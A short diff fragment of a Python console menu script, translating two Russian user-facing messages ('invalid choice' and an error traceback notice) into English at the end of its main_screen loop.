                     elif choice == "0":
                         break
                     else:
-                        print(f"{r}[{w}!{r}]{w} Неверный выбор")
+                        print(f"{r}[{w}!{r}]{w} Invalid choice")
                 
                 cont()
             elif select == '14':
@@ -2003,7 +1952,7 @@ def main_screen():
                 quit()
 
         except Exception:
-            print(f"{r}[{w}ERROR{r}]{w} Ошибка:\n {traceback.format_exc()}")
+            print(f"{r}[{w}ERROR{r}]{w} Error:\n {traceback.format_exc()}")
             cont()
 
 main_screen()
